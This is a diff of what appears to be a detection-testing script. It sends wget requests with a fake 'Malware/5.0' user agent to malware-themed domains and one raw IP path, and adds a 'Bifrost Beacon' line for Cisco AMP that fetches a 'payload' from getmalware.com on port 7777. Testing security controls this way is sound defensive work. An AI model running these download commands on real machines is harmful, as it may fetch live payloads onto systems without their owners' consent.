@@ -326,3 +326,9 @@ wget http://95.110.193.132/ser0410.bin -TimeoutSec 5 -UserAgent "Malware/5.0 (Wi
 wget http://www.examplemalwaredomain.com -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
 wget http://www.internetbadguys.com -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
 wget http://www.examplebotnetdomain.com -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
+
+
+###Cisco AMP###
+
+#Bifrost Beacon
+wget http://getmalware.com:7777/payload -TimeoutSec 5 -UserAgent "Malware/5.0 (Windows NT 9.0; Microsoft Windows 9.0.8675309; en-US)"
